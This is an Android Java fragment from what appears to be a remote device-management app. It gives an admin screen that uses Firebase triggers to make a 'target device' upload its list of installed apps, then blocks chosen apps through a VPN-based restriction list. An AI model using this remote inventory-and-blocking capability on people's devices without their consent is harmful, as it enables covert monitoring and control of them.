package com.vikasyadavnsit.cdc.fragment;

import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CheckBox;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.widget.SearchView;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.VpnConfig;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

public class AdminVpnAppListFragment extends Fragment {

    private RecyclerView recyclerView;
    private AppAdapter adapter;
    private List<AppInfo> allApps = new ArrayList<>();
    private List<AppInfo> filteredApps = new ArrayList<>();
    private VpnConfig currentConfig;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_admin_vpn_app_list, container, false);
        
        view.findViewById(R.id.vpn_app_list_back).setOnClickListener(v -> getParentFragmentManager().popBackStack());
        
        recyclerView = view.findViewById(R.id.vpn_app_list_rv);
        recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
        // Disable animations to prevent UI "jumps" or multiple selections during sync
        if (recyclerView.getItemAnimator() != null) {
            recyclerView.getItemAnimator().setChangeDuration(0);
            recyclerView.getItemAnimator().setAddDuration(0);
            recyclerView.getItemAnimator().setRemoveDuration(0);
            recyclerView.getItemAnimator().setMoveDuration(0);
        }
        
        SearchView searchView = view.findViewById(R.id.vpn_app_list_search);
        searchView.setOnQueryTextListener(new SearchView.OnQueryTextListener() {
            @Override
            public boolean onQueryTextSubmit(String query) { return false; }
            @Override
            public boolean onQueryTextChange(String newText) {
                filter(newText);
                return true;
            }
        });

        View refreshBtn = view.findViewById(R.id.vpn_app_list_refresh);
        if (refreshBtn != null) {
            refreshBtn.setOnClickListener(v -> {
                // 1. Send command to device to re-capture apps
                com.vikasyadavnsit.cdc.data.User.AppTriggerSettingsData trigger = 
                    com.vikasyadavnsit.cdc.data.User.AppTriggerSettingsData.builder()
                        .enabled(true).repeatable(false).maxRepetitions(1).interval(0)
                        .actionStatus(com.vikasyadavnsit.cdc.enums.ActionStatus.IDLE)
                        .clickActions(com.vikasyadavnsit.cdc.enums.ClickActions.CAPTURE_INSTALLED_APPS)
                        .uploadDataSnapshot(true).build();
                FirebaseUtils.updateRemoteTrigger(com.vikasyadavnsit.cdc.enums.ClickActions.CAPTURE_INSTALLED_APPS.name(), trigger);
                
                Toast.makeText(getContext(), "Syncing apps from device... please wait.", Toast.LENGTH_LONG).show();
                
                // 2. Wait a bit then reload from Firebase
                view.postDelayed(this::loadRemoteApps, 3000);
            });
        }

        loadConfigAndApps();
        return view;
    }

    private void loadConfigAndApps() {
        FirebaseUtils.getVpnConfig(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!isAdded()) return;
                VpnConfig newConfig = snapshot.exists() ? snapshot.getValue(VpnConfig.class) : new VpnConfig();
                if (newConfig == null) newConfig = new VpnConfig();
                
                currentConfig = newConfig;
                if (adapter != null) {
                    adapter.notifyDataSetChanged();
                } else {
                    loadRemoteApps();
                }
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        });
    }

    private void loadRemoteApps() {
        FirebaseUtils.getRemoteAppList(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (!isAdded()) return;
                if (!snapshot.exists()) {
                    Toast.makeText(getContext(), "Use the Sync icon (top right) to fetch apps from the target device.", Toast.LENGTH_LONG).show();
                    return;
                }

                List<AppInfo> tempList = new ArrayList<>();
                for (DataSnapshot child : snapshot.getChildren()) {
                    Object val = child.getValue();
                    if (val instanceof Map) {
                        Map<String, Object> data = (Map<String, Object>) val;
                        String name = String.valueOf(data.get("name"));
                        String pkg = String.valueOf(data.get("pkg"));
                        
                        // Sanity check: ignore items with missing package or the control app itself
                        if (pkg.isEmpty() || "null".equals(pkg) || pkg.equals(requireContext().getPackageName())) continue;

                        tempList.add(new AppInfo(
                            name,
                            pkg,
                            null, 
                            Boolean.TRUE.equals(data.get("isSystem")),
                            Boolean.TRUE.equals(data.get("hasLauncher"))
                        ));
                    }
                }
                sortAndDisplay(tempList);
            }
            @Override public void onCancelled(@NonNull DatabaseError e) {}
        });
    }

    private void sortAndDisplay(List<AppInfo> list) {
        list.sort((a, b) -> {
            if (a.hasLauncher != b.hasLauncher) return b.hasLauncher ? -1 : 1;
            boolean aCryptic = a.name.startsWith("com.") || a.name.startsWith("android.");
            boolean bCryptic = b.name.startsWith("com.") || b.name.startsWith("android.");
            if (aCryptic != bCryptic) return aCryptic ? 1 : -1;
            if (a.isSystem != b.isSystem) return a.isSystem ? 1 : -1;
            return a.name.compareToIgnoreCase(b.name);
        });

        if (getActivity() != null) {
            getActivity().runOnUiThread(() -> {
                allApps.clear();
                allApps.addAll(list);
                filteredApps.clear();
                filteredApps.addAll(allApps);
                if (adapter == null) {
                    adapter = new AppAdapter();
                    recyclerView.setAdapter(adapter);
                } else {
                    adapter.notifyDataSetChanged();
                }
            });
        }
    }

    private void filter(String query) {
        filteredApps = allApps.stream()
                .filter(a -> a.name.toLowerCase().contains(query.toLowerCase()) || a.pkg.toLowerCase().contains(query.toLowerCase()))
                .collect(Collectors.toList());
        if (adapter != null) adapter.notifyDataSetChanged();
    }

    private static class AppInfo {
        String name, pkg;
        Drawable icon;
        boolean isSystem;
        boolean hasLauncher;
        AppInfo(String name, String pkg, Drawable icon, boolean isSystem, boolean hasLauncher) {
            this.name = name; this.pkg = pkg; this.icon = icon; this.isSystem = isSystem; this.hasLauncher = hasLauncher;
        }
    }

    private class AppAdapter extends RecyclerView.Adapter<AppAdapter.ViewHolder> {
        @NonNull @Override public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            return new ViewHolder(LayoutInflater.from(parent.getContext()).inflate(R.layout.item_vpn_app_block, parent, false));
        }

        @Override public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
            AppInfo app = filteredApps.get(position);
            holder.name.setText(app.name + (app.isSystem ? " (System)" : ""));
            holder.pkg.setText(app.pkg);
            
            // App icon handling
            try {
                PackageManager pm = holder.itemView.getContext().getPackageManager();
                holder.icon.setImageDrawable(pm.getApplicationIcon(app.pkg));
            } catch (Exception e) {
                holder.icon.setImageResource(R.drawable.ic_launcher_foreground);
            }
            
            // Check if blocked - use a local helper to avoid null pointers
            boolean isBlocked = false;
            if (currentConfig != null && currentConfig.getRestrictedApps() != null) {
                // Ensure we use a clean set for comparison if duplicates exist
                isBlocked = currentConfig.getRestrictedApps().contains(app.pkg);
            }
            
            holder.checkBox.setOnCheckedChangeListener(null);
            holder.checkBox.setChecked(isBlocked);
            
            holder.itemView.setOnClickListener(v -> {
                if (currentConfig == null) currentConfig = new VpnConfig();
                if (currentConfig.getRestrictedApps() == null) currentConfig.setRestrictedApps(new ArrayList<>());
                
                String targetPkg = app.pkg;
                if (targetPkg == null || targetPkg.isEmpty() || "null".equals(targetPkg)) return;

                List<String> restricted = currentConfig.getRestrictedApps();
                
                // Toggle logic
                if (restricted.contains(targetPkg)) {
                    // Remove all instances of this package
                    restricted.removeIf(s -> s.equals(targetPkg));
                } else {
                    restricted.add(targetPkg);
                }
                
                // Optimistic UI update for the single item
                holder.checkBox.setChecked(restricted.contains(targetPkg));
                
                // Sync with Firebase
                FirebaseUtils.updateVpnConfig(currentConfig);
            });
        }

        @Override public int getItemCount() { return filteredApps.size(); }

        class ViewHolder extends RecyclerView.ViewHolder {
            ImageView icon; TextView name, pkg; CheckBox checkBox;
            ViewHolder(View v) {
                super(v);
                icon = v.findViewById(R.id.vpn_app_icon);
                name = v.findViewById(R.id.vpn_app_name);
                pkg = v.findViewById(R.id.vpn_app_pkg);
                checkBox = v.findViewById(R.id.vpn_app_checkbox);
            }
        }
    }
}
